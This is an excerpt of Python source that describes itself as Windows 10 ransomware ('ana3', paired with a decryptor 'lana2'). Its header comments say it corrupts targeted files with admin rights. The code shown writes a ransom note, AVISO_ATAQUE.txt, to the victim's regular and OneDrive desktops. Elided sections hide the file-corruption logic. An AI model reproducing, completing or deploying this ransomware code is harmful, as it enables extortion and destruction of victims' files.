#  This is a ransomware that is designed for windows 10 made to corrupt targeted files and programs as admin,
#  this is the version 6.0 called ana3 and it is paired with the decryption software lana2, this malware
...
#  For a grand finale, it will detect where your Desktop is (Some windows have it inside of OneDrive.)
#  and leave a note informing the victim that they were attacked and what to do to get their files back.
...
# This creates the note in all desktops that are not in OneDrive.
threatAddress1 = fr'C:\Users\{username}\Desktop'                        # Create normal desktop route.
if os.path.isdir(threatAddress1):                                       # If it exists.
    with open(fr'{threatAddress1}\AVISO_ATAQUE.txt', 'w') as f:         # Create the file.
        f.write(contents)                                               # And write inside the note from contents.

# This creates the note in all desktops that are in OneDrive.
threatAddress2 = fr'C:\Users\{username}\OneDrive\Desktop'               # Create OneDrive desktop route.
if os.path.isdir(threatAddress2):                                       # If it exists.
    with open(fr'{threatAddress2}\AVISO_ATAQUE.txt', 'w') as f:         # Create the file.
        f.write(contents)                                               # And write inside the note from contents.
